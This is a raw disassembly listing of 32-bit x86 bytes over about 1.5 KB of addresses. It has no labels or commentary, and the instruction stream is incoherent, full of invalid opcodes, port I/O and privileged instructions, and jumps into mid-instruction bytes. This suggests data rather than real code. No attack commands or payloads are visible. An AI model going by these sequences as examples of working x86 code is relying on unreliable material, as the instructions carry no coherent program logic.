  417ba1:	28 fc                	sub    %bh,%ah
  417ba3:	75 6c                	jne    0x417c11
  417ba5:	c3                   	ret
  417ba6:	a2 fe 5e 09 db       	mov    %al,0xdb095efe
  417bab:	75 c6                	jne    0x417b73
  417bad:	5b                   	pop    %ebx
  417bae:	7b 5c                	jnp    0x417c0c
  417bb0:	53                   	push   %ebx
  417bb1:	6b 7b 38 0e          	imul   $0xe,0x38(%ebx),%edi
  417bb5:	85 e4                	test   %esp,%esp
  417bb7:	ec                   	in     (%dx),%al
  417bb8:	04 f0                	add    $0xf0,%al
  417bba:	1c 99                	sbb    $0x99,%al
  417bbc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  417bbd:	02 95 12 4a fc 8b    	add    -0x7403b5ee(%ebp),%dl
  417bc3:	14 8b                	adc    $0x8b,%al
  417bc5:	94                   	xchg   %eax,%esp
  417bc6:	d3 54 03 1a          	rcll   %cl,0x1a(%ebx,%eax,1)
  417bca:	06                   	push   %es
  417bcb:	ef                   	out    %eax,(%dx)
  417bcc:	41                   	inc    %ecx
  417bcd:	5f                   	pop    %edi
  417bce:	b6 9c                	mov    $0x9c,%dh
  417bd0:	b1 07                	mov    $0x7,%cl
  417bd2:	77 8e                	ja     0x417b62
  417bd4:	4d                   	dec    %ebp
  417bd5:	2a 0a                	sub    (%edx),%cl
  417bd7:	00 b2 ad e4 40 2b    	add    %dh,0x2b40e4ad(%edx)
  417bdd:	96                   	xchg   %eax,%esi
  417bde:	8a a4 0c ca 8d 41 c0 	mov    -0x3fbe7236(%esp,%ecx,1),%ah
  417be5:	60                   	pusha
  417be6:	0e                   	push   %cs
  417be7:	c6                   	(bad)
  417be8:	0b d0                	or     %eax,%edx
  417bea:	c4 66 30             	les    0x30(%esi),%esp
  417bed:	9b                   	fwait
  417bee:	16                   	push   %ss
  417bef:	22 7b 3b             	and    0x3b(%ebx),%bh
  417bf2:	5a                   	pop    %edx
  417bf3:	07                   	pop    %es
  417bf4:	7b 00                	jnp    0x417bf6
  417bf6:	77 ec                	ja     0x417be4
  417bf8:	2c 06                	sub    $0x6,%al
  417bfa:	9a 48 f7 c2 ee 03 12 	lcall  $0x1203,$0xeec2f748
  417c01:	eb 20                	jmp    0x417c23
  417c03:	51                   	push   %ecx
  417c04:	eb 15                	jmp    0x417c1b
  417c06:	0f 04                	(bad)
  417c08:	ac                   	lods   %ds:(%esi),%al
  417c09:	b9 22 0c 05 3d       	mov    $0x3d050c22,%ecx
  417c0e:	04 51                	add    $0x51,%al
  417c10:	66 6d                	insw   (%dx),%es:(%edi)
  417c12:	09 6b 30             	or     %ebp,0x30(%ebx)
  417c15:	e8 5d ab 51 4e       	call   0x4e932777
  417c1a:	0e                   	push   %cs
  417c1b:	c6 82 43 12 8a ef c3 	movb   $0xc3,-0x1075edbd(%edx)
  417c22:	90                   	nop
  417c23:	50                   	push   %eax
  417c24:	2f                   	das
  417c25:	21 2f                	and    %ebp,(%edi)
  417c27:	6c                   	insb   (%dx),%es:(%edi)
  417c28:	bf ec 49 aa c0       	mov    $0xc0aa49ec,%edi
  417c2d:	e3 ae                	jecxz  0x417bdd
  417c2f:	7c b9                	jl     0x417bea
  417c31:	6e                   	outsb  %ds:(%esi),(%dx)
  417c32:	bc db 90 5a c9       	mov    $0xc95a90db,%esp
  417c37:	73 bf                	jae    0x417bf8
  417c39:	bb 45 5d 42 13       	mov    $0x13425d45,%ebx
  417c3e:	11 5b 05             	adc    %ebx,0x5(%ebx)
  417c41:	c3                   	ret
  417c42:	1b 03                	sbb    (%ebx),%eax
  417c44:	cf                   	iret
  417c45:	e0 3d                	loopne 0x417c84
  417c47:	40                   	inc    %eax
  417c48:	2c 06                	sub    $0x6,%al
  417c4a:	5c                   	pop    %esp
  417c4b:	ee                   	out    %al,(%dx)
  417c4c:	0a 8c 82 56 14 3e 32 	or     0x323e1456(%edx,%eax,4),%cl
  417c53:	0f ae 71 57          	xsaveopt 0x57(%ecx)
  417c57:	94                   	xchg   %eax,%esp
  417c58:	4a                   	dec    %edx
  417c59:	7e 3f                	jle    0x417c9a
  417c5b:	81 86 92 be 62 42 c1 	addl   $0xfd1e7ec1,0x4262be92(%esi)
  417c62:	7e 1e fd 
  417c65:	a0 b9 06 f2 3b       	mov    0x3bf206b9,%al
  417c6a:	f6 12                	notb   (%edx)
  417c6c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  417c6d:	81 eb 1d eb 15 00    	sub    $0x15eb1d,%ebx
  417c73:	6e                   	outsb  %ds:(%esi),(%dx)
  417c74:	27                   	daa
  417c75:	34 62                	xor    $0x62,%al
  417c77:	53                   	push   %ebx
  417c78:	db 3e                	fstpt  (%esi)
  417c7a:	7f c1                	jg     0x417c3d
  417c7c:	b0 b3                	mov    $0xb3,%al
  417c7e:	37                   	aaa
  417c7f:	0c 2b                	or     $0x2b,%al
  417c81:	b1 3c                	mov    $0x3c,%cl
  417c83:	04 e1                	add    $0xe1,%al
  417c85:	c8 1e 8b c1          	enter  $0x8b1e,$0xc1
  417c89:	13 ab af 9c 59 a3    	adc    -0x5ca66351(%ebx),%ebp
  417c8f:	b9 64 ff 6c 3e       	mov    $0x3e6cff64,%ecx
  417c94:	9c                   	pushf
  417c95:	d4 04                	aam    $0x4
  417c97:	fe                   	(bad)
  417c98:	2c 03                	sub    $0x3,%al
  417c9a:	73 b0                	jae    0x417c4c
  417c9c:	30 39                	xor    %bh,(%ecx)
  417c9e:	d8 9b 55 9a 32 c8    	fcomps -0x37cd65ab(%ebx)
  417ca4:	b1 e0                	mov    $0xe0,%cl
  417ca6:	6a c9                	push   $0xffffffc9
  417ca8:	65 2b da             	gs sub %edx,%ebx
  417cab:	b7 bd                	mov    $0xbd,%bh
  417cad:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  417cae:	0a c1                	or     %cl,%al
  417cb0:	bf 7e f5 d9 c1       	mov    $0xc1d9f57e,%edi
  417cb5:	54                   	push   %esp
  417cb6:	50                   	push   %eax
  417cb7:	58                   	pop    %eax
  417cb8:	58                   	pop    %eax
  417cb9:	bc d0 f0 dd 17       	mov    $0x17ddf0d0,%esp
  417cbe:	68 87 6a 13 0f       	push   $0xf136a87
  417cc3:	87 17                	xchg   %edx,(%edi)
  417cc5:	67 ff 24             	jmp    *(%si)
  417cc8:	85 b3 c0 9a a6 eb    	test   %esi,-0x14596540(%ebx)
  417cce:	0a 7e 24             	or     0x24(%esi),%bh
  417cd1:	08 03                	or     %al,(%ebx)
  417cd3:	14 25                	adc    $0x25,%al
  417cd5:	36 06                	ss push %es
  417cd7:	19 a4 69 44 52 c3 5f 	sbb    %esp,0x5fc35244(%ecx,%ebp,2)
  417cde:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  417cdf:	1b a4 e9 0f 68 72 7b 	sbb    0x7b72680f(%ecx,%ebp,8),%esp
  417ce6:	03 84 bb a6 69 9a 92 	add    -0x6d65965a(%ebx,%edi,4),%eax
  417ced:	a0 ae b7 e9 b3       	mov    0xb3e9b7ae,%al
  417cf2:	bf 55 c3 96 cd       	mov    $0xcd96c355,%edi
  417cf7:	7e 6d                	jle    0x417d66
  417cf9:	74 59                	je     0x417d54
  417cfb:	0b d4                	or     %esp,%edx
  417cfd:	10 d9                	adc    %bl,%cl
  417cff:	2e 3b 92 02 04 f6 7f 	cmp    %cs:0x7ff60402(%edx),%edx
  417d06:	0d 0a fb 63 12       	or     $0x1263fb0a,%eax
  417d0b:	2f                   	das
  417d0c:	71 8d                	jno    0x417c9b
  417d0e:	54                   	push   %esp
  417d0f:	0c eb                	or     $0xeb,%al
  417d11:	64 55                	fs push %ebp
  417d13:	15 1d f2 b3 e5       	adc    $0xe5b3f21d,%eax
  417d18:	f0 5b                	lock pop %ebx
  417d1a:	12 af 2c eb 51 48    	adc    0x4851eb2c(%edi),%ch
  417d20:	d9 26                	fldenv (%esi)
  417d22:	6c                   	insb   (%dx),%es:(%edi)
  417d23:	f9                   	stc
  417d24:	08 b0 18 3f 4d 31    	or     %dh,0x314d3f18(%eax)
  417d2a:	0d 08 3b 6c 42       	or     $0x426c3b08,%eax
  417d2f:	2e 23 15 3b 0c 16 92 	and    %cs:0x92160c3b,%edx
  417d36:	87 00                	xchg   %eax,(%eax)
  417d38:	03 68 e0             	add    -0x20(%eax),%ebp
  417d3b:	c1 c9 03             	ror    $0x3,%ecx
  417d3e:	e3 90                	jecxz  0x417cd0
  417d40:	c8 b3 21 c2          	enter  $0x21b3,$0xc2
  417d44:	9c                   	pushf
  417d45:	0c c3                	or     $0xc3,%al
  417d47:	5b                   	pop    %ebx
  417d48:	06                   	push   %es
  417d49:	ce                   	into
  417d4a:	b4 28                	mov    $0x28,%ah
  417d4c:	c2 9b e6             	ret    $0xe69b
  417d4f:	6b 81 43 d6 c7 4f 0c 	imul   $0xc,0x4fc7d643(%ecx),%eax
  417d56:	59                   	pop    %ecx
  417d57:	ee                   	out    %al,(%dx)
  417d58:	01 ce                	add    %ecx,%esi
  417d5a:	2b 4f 65             	sub    0x65(%edi),%ecx
  417d5d:	74 0e                	je     0x417d6d
  417d5f:	43                   	inc    %ebx
  417d60:	24 cb                	and    $0xcb,%al
  417d62:	b2 fc                	mov    $0xfc,%dl
  417d64:	29 cb                	sub    %ecx,%ebx
  417d66:	57                   	push   %edi
  417d67:	8b 47 47             	mov    0x47(%edi),%eax
  417d6a:	4f                   	dec    %edi
  417d6b:	c7                   	(bad)
  417d6c:	66 b0 06             	data16 mov $0x6,%al
  417d6f:	32 5f 42             	xor    0x42(%edi),%bl
  417d72:	10 2c d7             	adc    %ch,(%edi,%edx,8)
  417d75:	eb 04                	jmp    0x417d7b
  417d77:	79 22                	jns    0x417d9b
  417d79:	a8 1f                	test   $0x1f,%al
  417d7b:	02 c5                	add    %ch,%al
  417d7d:	79 72                	jns    0x417df1
  417d7f:	b2 f8                	mov    $0xf8,%dl
  417d81:	b2 f8                	mov    $0xf8,%dl
  417d83:	36 b5 08             	ss mov $0x8,%ch
  417d86:	68 5a e8 81 a9       	push   $0xa981e85a
  417d8b:	0f 24 f7             	mov    %tr6,%edi
  417d8e:	de fa                	fdivrp %st,%st(2)
  417d90:	7f 19                	jg     0x417dab
  417d92:	b2 06                	mov    $0x6,%dl
  417d94:	b7 23                	mov    $0x23,%bh
  417d96:	e9 b2 28 2e 96       	jmp    0x966fa64d
  417d9b:	5c                   	pop    %esp
  417d9c:	f6 eb                	imul   %bl
  417d9e:	17                   	pop    %ss
  417d9f:	b2 0c                	mov    $0xc,%dl
  417da1:	18 04 14             	sbb    %al,(%esp,%edx,1)
  417da4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  417da5:	06                   	push   %es
  417da6:	39 48 df             	cmp    %ecx,-0x21(%eax)
  417da9:	b2 28                	mov    $0x28,%dl
  417dab:	88 e9                	mov    %ch,%cl
  417dad:	d9 c0                	fld    %st(0)
  417daf:	cd 66                	int    $0x66
  417db1:	3c 15                	cmp    $0x15,%al
  417db3:	13 0d 40 db 46 e2    	adc    0xe246db40,%ecx
  417db9:	1d 12 a1 07 c1       	sbb    $0xc107a112,%eax
  417dbe:	30 9a a3 0c 0c 4e    	xor    %bl,0x4e0c0ca3(%edx)
  417dc4:	88 e0                	mov    %ah,%al
  417dc6:	c3                   	ret
  417dc7:	b7 20                	mov    $0x20,%bh
  417dc9:	26 36 60             	es ss pusha
  417dcc:	20 2f                	and    %ch,(%edi)
  417dce:	81 c3 9a 15 62 30    	add    $0x3062159a,%ebx
  417dd4:	03 57 6c             	add    0x6c(%edi),%edx
  417dd7:	28 13                	sub    %dl,(%ebx)
  417dd9:	cd c9                	int    $0xc9
  417ddb:	60                   	pusha
  417ddc:	03 90 ee 11 88 c3    	add    -0x3c77ee12(%eax),%edx
  417de2:	20 08                	and    %cl,(%eax)
  417de4:	de 6c 24 11          	fisubrs 0x11(%esp)
  417de8:	2c 52                	sub    $0x52,%al
  417dea:	e1 7e                	loope  0x417e6a
  417dec:	87 c3                	xchg   %eax,%ebx
  417dee:	37                   	aaa
  417def:	93                   	xchg   %eax,%ebx
  417df0:	a0 8f 17 c0 35       	mov    0x35c0178f,%al
  417df5:	27                   	daa
  417df6:	79 4c                	jns    0x417e44
  417df8:	c4 14 06             	les    (%esi,%eax,1),%edx
  417dfb:	81 b5 ef 6c 37 83 f8 	xorl   $0x10a129f8,-0x7cc89311(%ebp)
  417e02:	29 a1 10 
  417e05:	3e 7c 38             	jl,pt  0x417e40
  417e08:	45                   	inc    %ebp
  417e09:	c3                   	ret
  417e0a:	1e                   	push   %ds
  417e0b:	f6 b3 28 a1 18 4d    	divb   0x4d18a128(%ebx)
  417e11:	a1 1c 09 b5 24       	mov    0x24b5091c,%eax
  417e16:	ef                   	out    %eax,(%dx)
  417e17:	1c dc                	sbb    $0xdc,%al
  417e19:	12 ac 48 a1 24 d8 66 	adc    0x66d824a1(%eax,%ecx,2),%ch
  417e20:	1c 80                	sbb    $0x80,%al
  417e22:	98                   	cwtl
  417e23:	0b d2                	or     %edx,%edx
  417e25:	51                   	push   %ecx
  417e26:	7e c9                	jle    0x417df1
  417e28:	de e7                	fsubp  %st,%st(7)
  417e2a:	16                   	push   %ss
  417e2b:	42                   	inc    %edx
  417e2c:	0c 51                	or     $0x51,%al
  417e2e:	25 0b b8 98 a3       	and    $0xa398b80b,%eax
  417e33:	38 79 e7             	cmp    %bh,-0x19(%ecx)
  417e36:	b8 1a 39 a8 68       	mov    $0x68a8391a,%eax
  417e3b:	28 4c 1b fb          	sub    %cl,-0x5(%ebx,%ebx,1)
  417e3f:	aa                   	stos   %al,%es:(%edi)
  417e40:	25 27 53 c4 d3       	and    $0xd3c45327,%eax
  417e45:	2d a6 80 c9 26       	sub    $0x26c980a6,%eax
  417e4a:	fb                   	sti
  417e4b:	01 73 69             	add    %esi,0x69(%ebx)
  417e4e:	2c f0                	sub    $0xf0,%al
  417e50:	40                   	inc    %eax
  417e51:	a0 ec 62 9f ae       	mov    0xae9f62ec,%al
  417e56:	94                   	xchg   %eax,%esp
  417e57:	6a 7b                	push   $0x7b
  417e59:	ac                   	lods   %ds:(%esi),%al
  417e5a:	5b                   	pop    %ebx
  417e5b:	10 20                	adc    %ah,(%eax)
  417e5d:	9f                   	lahf
  417e5e:	09 c0                	or     %eax,%eax
  417e60:	93                   	xchg   %eax,%ebx
  417e61:	8f                   	(bad)
  417e62:	96                   	xchg   %eax,%esi
  417e63:	9c                   	pushf
  417e64:	a3 18 68 a1 d2       	mov    %eax,0xd2a16818
  417e69:	de c8                	fmulp  %st,%st(0)
  417e6b:	8e ec                	mov    %esp,%gs
  417e6d:	a3 1c 21 20 10       	mov    %eax,0x1020211c
  417e72:	c5 8a 90 51 15 33    	lds    0x33155190(%edx),%ecx
  417e78:	df 33                	fbstp  (%ebx)
  417e7a:	c9                   	leave
  417e7b:	49                   	dec    %ecx
  417e7c:	1a 4f 31             	sbb    0x31(%edi),%cl
  417e7f:	20 c5                	and    %al,%ch
  417e81:	44                   	inc    %esp
  417e82:	ec                   	in     (%dx),%al
  417e83:	40                   	inc    %eax
  417e84:	42                   	inc    %edx
  417e85:	71 15                	jno    0x417e9c
  417e87:	b8 b0 45 27 c5       	mov    $0xc52745b0,%eax
  417e8c:	d3 55 2c             	rcll   %cl,0x2c(%ebp)
  417e8f:	f4                   	hlt
  417e90:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  417e91:	36 01 32             	add    %esi,%ss:(%edx)
  417e94:	c5 07                	lds    (%edi),%eax
  417e96:	42                   	inc    %edx
  417e97:	4e                   	dec    %esi
  417e98:	24 4f                	and    $0x4f,%al
  417e9a:	80 c5 52             	add    $0x52,%ch
  417e9d:	65 2e 60             	gs cs pusha
  417ea0:	93                   	xchg   %eax,%ebx
  417ea1:	fc                   	cld
  417ea2:	67 69 73 74 72 79 e0 	imul   $0x5fe07972,0x74(%bp,%di),%esi
  417ea9:	5f 
  417eaa:	0b 02                	or     (%edx),%eax
  417eac:	51                   	push   %ecx
  417ead:	33 65 5f             	xor    0x5f(%ebp),%esp
  417eb0:	f2 1c 47             	repnz sbb $0x47,%al
  417eb3:	5d                   	pop    %ebp
  417eb4:	86 e4                	xchg   %ah,%ah
  417eb6:	55                   	push   %ebp
  417eb7:	d8 c6                	fadd   %st(6),%st
  417eb9:	10 09                	adc    %cl,(%ecx)
  417ebb:	54                   	push   %esp
  417ebc:	70 24                	jo     0x417ee2
  417ebe:	22 86 71 a3 89 1c    	and    0x1c89a371(%esi),%al
  417ec4:	21 9f 97 40 b4 30    	and    %ebx,0x30b44097(%edi)
  417eca:	f4                   	hlt
  417ecb:	34 c5                	xor    $0xc5,%al
  417ecd:	e2 4d                	loop   0x417f1c
  417ecf:	c5 22                	lds    (%edx),%esp
  417ed1:	4f                   	dec    %edi
  417ed2:	39 09                	cmp    %ecx,(%ecx)
  417ed4:	80 3b 5c             	cmpb   $0x5c,(%ebx)
  417ed7:	05 ed 66 22 89       	add    $0x892266ed,%eax
  417edc:	0f b0 01             	cmpxchg %al,(%ecx)
  417edf:	03 05 37 4d b7 af    	add    0xafb74d37,%eax
  417ee5:	0e                   	push   %cs
  417ee6:	03 10                	add    (%eax),%edx
  417ee8:	12 14 eb             	adc    (%ebx,%ebp,8),%dl
  417eeb:	18 48 77             	sbb    %cl,0x77(%eax)
  417eee:	20 12                	and    %dl,(%edx)
  417ef0:	1a 2d 05 04 2a 8e    	sbb    0x8e2a0405,%ch
  417ef6:	d0 ce                	ror    $1,%dh
  417ef8:	03 31                	add    (%ecx),%esi
  417efa:	3f                   	aas
  417efb:	f8                   	clc
  417efc:	01 db                	add    %ebx,%ebx
  417efe:	37                   	aaa
  417eff:	54                   	push   %esp
  417f00:	3d a7 00 04 b0       	cmp    $0xb00400a7,%eax
  417f05:	02 eb                	add    %bl,%ch
  417f07:	14 08                	adc    $0x8,%al
  417f09:	04 02                	add    $0x2,%al
  417f0b:	c0 2c 37 03          	shrb   $0x3,(%edi,%esi,1)
  417f0f:	eb 0b                	jmp    0x417f1c
  417f11:	03 a6 24 c0 f1 ce    	add    -0x310e3fdc(%esi),%esp
  417f17:	f3 f3 ba 00 e0 c7 ea 	repz repz mov $0xeac7e000,%edx
  417f1e:	57                   	push   %edi
  417f1f:	80 03 b7             	addb   $0xb7,(%ebx)
  417f22:	30 c7                	xor    %al,%bh
  417f24:	46                   	inc    %esi
  417f25:	18 4c 21 01          	sbb    %cl,0x1(%ecx,%eiz,1)
  417f29:	ef                   	out    %eax,(%dx)
  417f2a:	c4                   	(bad)
  417f2b:	c6 46 0c 01          	movb   $0x1,0xc(%esi)
  417f2f:	e5 90                	in     $0x90,%eax
  417f31:	29 e4                	sub    %esp,%esp
  417f33:	90                   	nop
  417f34:	04 47                	add    $0x47,%al
  417f36:	b7 00                	mov    $0x0,%bh
  417f38:	56                   	push   %esi
  417f39:	0b e1                	or     %ecx,%esp
  417f3b:	72 db                	jb     0x417f18
  417f3d:	85 db                	test   %ebx,%ebx
  417f3f:	21 9b 04 f0 c9 d1    	and    %ebx,-0x2e360ffc(%ebx)
  417f45:	0c 77                	or     $0x77,%al
  417f47:	f5                   	cmc
  417f48:	4b                   	dec    %ebx
  417f49:	f0 8a d6             	lock mov %dh,%dl
  417f4c:	af                   	scas   %es:(%edi),%eax
  417f4d:	23 2d 4c 00 98 04    	and    0x498004c,%ebp
  417f53:	8d 9b 80 21 c5 0c    	lea    0xcc52180(%ebx),%ebx
  417f59:	f4                   	hlt
  417f5a:	fb                   	sti
  417f5b:	7b b2                	jnp    0x417f0f
  417f5d:	6c                   	insb   (%dx),%es:(%edi)
  417f5e:	bf dc 74 1a 32       	mov    $0x321a74dc,%edi
  417f63:	14 0a                	adc    $0xa,%al
  417f65:	c6 43 0b 40          	movb   $0x40,0xb(%ebx)
  417f69:	ec                   	in     (%dx),%al
  417f6a:	51                   	push   %ecx
  417f6b:	44                   	inc    %esp
  417f6c:	4f                   	dec    %edi
  417f6d:	70 f0                	jo     0x417f5f
  417f6f:	dc 2c 61             	fsubrl (%ecx,%eiz,2)
  417f72:	6f                   	outsl  %ds:(%esi),(%dx)
  417f73:	14 1e                	adc    $0x1e,%al
  417f75:	4b                   	dec    %ebx
  417f76:	15 f0 80 19 42       	adc    $0x421980f0,%eax
  417f7b:	3b 0a                	cmp    (%edx),%ecx
  417f7d:	6d                   	insl   (%dx),%es:(%edi)
  417f7e:	8b e2                	mov    %edx,%esp
  417f80:	6c                   	insb   (%dx),%es:(%edi)
  417f81:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  417f82:	04 f4                	add    $0xf4,%al
  417f84:	03 38                	add    (%eax),%edi
  417f86:	ac                   	lods   %ds:(%esi),%al
  417f87:	b6 25                	mov    $0x25,%dh
  417f89:	90                   	nop
  417f8a:	08 34 c1             	or     %dh,(%ecx,%eax,8)
  417f8d:	2b ec                	sub    %esp,%ebp
  417f8f:	20 07                	and    %al,(%edi)
  417f91:	39 03                	cmp    %eax,(%ebx)
  417f93:	e8 f8 64 c8 cc       	call   0xcd09e490
  417f98:	c0 81 80 e8 ec 49 77 	rolb   $0x77,0x49ece880(%ecx)
  417f9f:	6b 4f ea 90          	imul   $0xffffff90,-0x16(%edi),%ecx
  417fa3:	19 b6 24 67 da 75    	sbb    %esi,0x75da6724(%esi)
  417fa9:	12 17                	adc    (%edi),%dl
  417fab:	0e                   	push   %cs
  417fac:	06                   	push   %es
  417fad:	44                   	inc    %esp
  417fae:	2c d5                	sub    $0xd5,%al
  417fb0:	cf                   	iret
  417fb1:	28 8c 00 65 04 20 e6 	sub    %cl,-0x19dffb9b(%eax,%eax,1)
  417fb8:	fc                   	cld
  417fb9:	2a 66 6f             	sub    0x6f(%esi),%ah
  417fbc:	16                   	push   %ss
  417fbd:	01 01                	add    %eax,(%ecx)
  417fbf:	34 d1                	xor    $0xd1,%al
  417fc1:	b1 13                	mov    $0x13,%cl
  417fc3:	ba 1e d3 23 80       	mov    $0x8023d31e,%edx
  417fc8:	c6 f8 85             	xabort $0x85
  417fcb:	08 0e                	or     %cl,(%esi)
  417fcd:	82 ef 45             	sub    $0x45,%bh
  417fd0:	49                   	dec    %ecx
  417fd1:	74 32                	je     0x418005
  417fd3:	0d f0 22 d8 2a       	or     $0x2ad822f0,%eax
  417fd8:	4e                   	dec    %esi
  417fd9:	7d 6d                	jge    0x418048
  417fdb:	00 f2                	add    %dh,%dl
  417fdd:	c3                   	ret
  417fde:	05 c0 29 c8 f3       	add    $0xf3c829c0,%eax
  417fe3:	60                   	pusha
  417fe4:	25 27 83 8a 6b       	and    $0x6b8a8327,%eax
  417fe9:	c8 0a 06 0c          	enter  $0x60a,$0xc
  417fed:	8b 57 ef             	mov    -0x11(%edi),%edx
  417ff0:	9b                   	fwait
  417ff1:	ea f0 26 86 f4 88 4d 	ljmp   $0x4d88,$0xf48626f0
  417ff8:	ff a4 4d 79 c9 90 c1 	jmp    *-0x3e6f3687(%ebp,%ecx,2)
  417fff:	ca 21 45             	lret   $0x4521
  418002:	d8 f4                	fdiv   %st(4),%st
  418004:	56                   	push   %esi
  418005:	0f 21 99             	mov    %db3,%ecx
  418008:	f4                   	hlt
  418009:	07                   	pop    %es
  41800a:	f8                   	clc
  41800b:	c3                   	ret
  41800c:	68 ae 81 3a 06       	push   $0x63a81ae
  418011:	83 90 2a 75 cf cf 01 	adcl   $0x1,-0x30308ad6(%eax)
  418018:	e4 db                	in     $0xdb,%al
  41801a:	22 50 de             	and    -0x22(%eax),%dl
  41801d:	f4                   	hlt
  41801e:	4c                   	dec    %esp
  41801f:	08 45 19             	or     %al,0x19(%ebp)
  418022:	40                   	inc    %eax
  418023:	94                   	xchg   %eax,%esp
  418024:	ea fe eb 32 24 fa 52 	ljmp   $0x52fa,$0x2432ebfe
  41802b:	c8 09 b3 2f          	enter  $0xb309,$0x2f
  41802f:	12 f4                	adc    %ah,%dh
  418031:	94                   	xchg   %eax,%esp
  418032:	a2 cb d6 33 67       	mov    %al,0x6733d6cb
  418037:	fe                   	(bad)
  418038:	30 83 65 a5 4a 6d    	xor    %al,0x6d4aa565(%ebx)
  41803e:	04 85                	add    $0x85,%al
  418040:	84 8c 5b 77 02 58 a2 	test   %cl,-0x5da7fd89(%ebx,%ebx,2)
  418047:	76 c1                	jbe    0x41800a
  418049:	c9                   	leave
  41804a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  41804b:	9a 30 55 b2 00 2a c3 	lcall  $0xc32a,$0xb25530
  418052:	1e                   	push   %ds
  418053:	56                   	push   %esi
  418054:	8c b9 06 41 5c 82    	mov    %?,-0x7da3befa(%ecx)
  41805a:	80 c9 ac             	or     $0xac,%cl
  41805d:	09 6d 4a             	or     %ebp,0x4a(%ebp)
  418060:	8a 55 14             	mov    0x14(%ebp),%dl
  418063:	b3 23                	mov    $0x23,%bl
  418065:	45                   	inc    %ebp
  418066:	61                   	popa
  418067:	06                   	push   %es
  418068:	5c                   	pop    %esp
  418069:	53                   	push   %ebx
  41806a:	e9 03 a0 f1 50       	jmp    0x51332072
  41806f:	d8 c5                	fadd   %st(5),%st
  418071:	03 64 03 d0          	add    -0x30(%ebx,%eax,1),%esp
  418075:	4e                   	dec    %esi
  418076:	c1 35 40 1b 35 6b 16 	shll   $0x16,0x6b351b40
  41807d:	00 22                	add    %ah,(%edx)
  41807f:	08 c7                	or     %al,%bh
  418081:	ad                   	lods   %ds:(%esi),%eax
  418082:	14 e2                	adc    $0xe2,%al
  418084:	19 73 8c             	sbb    %esi,-0x74(%ebx)
  418087:	db 10                	fistl  (%eax)
  418089:	c3                   	ret
  41808a:	9a 11 0e 36 38 33 69 	lcall  $0x6933,$0x38360e11
  418091:	45                   	inc    %ebp
  418092:	fb                   	sti
  418093:	4b                   	dec    %ebx
  418094:	2a 62 02             	sub    0x2(%edx),%ah
  418097:	13 63 00             	adc    0x0(%ebx),%esp
  41809a:	86 9e 10 7a b9 94    	xchg   %bl,-0x6b4685f0(%esi)
  4180a0:	8e a0 51 35 56 45    	mov    0x45563551(%eax),%fs
  4180a6:	03 af 84 40 31 a9    	add    -0x56cebf7c(%edi),%ebp
  4180ac:	03 d8                	add    %eax,%ebx
  4180ae:	c5 4c 6d 89          	lds    -0x77(%ebp,%ebp,2),%ecx
  4180b2:	71 40                	jno    0x4180f4
  4180b4:	65 66 65 8a e2       	gs data16 gs mov %dl,%ah
  4180b9:	d8 12                	fcoms  (%edx)
  4180bb:	27                   	daa
  4180bc:	d7                   	xlat   %ds:(%ebx)
  4180bd:	39 ba c4 8e 75 1d    	cmp    %edi,0x1d758ec4(%edx)
  4180c3:	4b                   	dec    %ebx
  4180c4:	f7 dd                	neg    %ebp
  4180c6:	ea a3 d5 24 b9 e4 87 	ljmp   $0x87e4,$0xb924d5a3
  4180cd:	54                   	push   %esp
  4180ce:	6d                   	insl   (%dx),%es:(%edi)
  4180cf:	8c a5 4f 97 9d 53    	mov    %fs,0x539d974f(%ebp)
  4180d5:	1b 36                	sbb    (%esi),%esi
  4180d7:	12 00                	adc    (%eax),%al
  4180d9:	33 07                	xor    (%edi),%eax
  4180db:	42                   	inc    %edx
  4180dc:	28 6b 5b             	sub    %ch,0x5b(%ebx)
  4180df:	10 3c bb             	adc    %bh,(%ebx,%edi,4)
  4180e2:	2c 71                	sub    $0x71,%al
  4180e4:	01 7e 05             	add    %edi,0x5(%esi)
  4180e7:	a3 22 d8 96 0b       	mov    %eax,0xb96d822
  4180ec:	17                   	pop    %ss
  4180ed:	1d e4 25 03 c5       	sbb    $0xc50325e4,%eax
  4180f2:	1b d0                	sbb    %eax,%edx
  4180f4:	d4 6d                	aam    $0x6d
  4180f6:	25 84 08 47 9b       	and    $0x9b470884,%eax
  4180fb:	c5 b5 f8 57 b9 41    	lds    0x41b957f8(%ebp),%esi
  418101:	84 89 59 ca b7 63    	test   %cl,0x63b7ca59(%ecx)
  418107:	ae                   	scas   %es:(%edi),%al
  418108:	22 be 75 6a 04 6a    	and    0x6a046a75(%esi),%bh
  41810e:	03 db                	add    %ebx,%ebx
  418110:	8e 5a a4             	mov    -0x5c(%edx),%ds
  418113:	0a 42 10             	or     0x10(%edx),%al
  418116:	07                   	pop    %es
  418117:	0d 54 ee 57 38       	or     $0x3857ee54,%eax
  41811c:	d8 57 1a             	fcoms  0x1a(%edi)
  41811f:	b6 38                	mov    $0x38,%dh
  418121:	9a 64 40 f8 68 d2 c6 	lcall  $0xc6d2,$0x68f84064
  418128:	56                   	push   %esi
  418129:	2e 43                	cs inc %ebx
  41812b:	04 0e                	add    $0xe,%al
  41812d:	47                   	inc    %edi
  41812e:	d5 4a                	aad    $0x4a
  418130:	d7                   	xlat   %ds:(%ebx)
  418131:	60                   	pusha
  418132:	80 c0 81             	add    $0x81,%al
  418135:	26 70 01             	es jo  0x418139
  418138:	49                   	dec    %ecx
  418139:	cb                   	lret
  41813a:	0a 93 0d 84 67 d5    	or     -0x2a987bf3(%ebx),%dl
  418140:	e9 4e dd a4 86       	jmp    0x86e65e93
  418145:	61                   	popa
  418146:	57                   	push   %edi
  418147:	5d                   	pop    %ebp
  418148:	61                   	popa
  418149:	c6                   	(bad)
  41814a:	9c                   	pushf
  41814b:	90                   	nop
  41814c:	91                   	xchg   %eax,%ecx
  41814d:	0b 10                	or     (%eax),%edx
  41814f:	75 30                	jne    0x418181
  418151:	f5                   	cmc
  418152:	5c                   	pop    %esp
  418153:	a3 22 80 35 a4       	mov    %eax,0xa4358022
  418158:	50                   	push   %eax
  418159:	6c                   	insb   (%dx),%es:(%edi)
  41815a:	54                   	push   %esp
  41815b:	11 b6 0e 88 92 54    	adc    %esi,0x5492880e(%esi)
  418161:	21 2b                	and    %ebp,(%ebx)
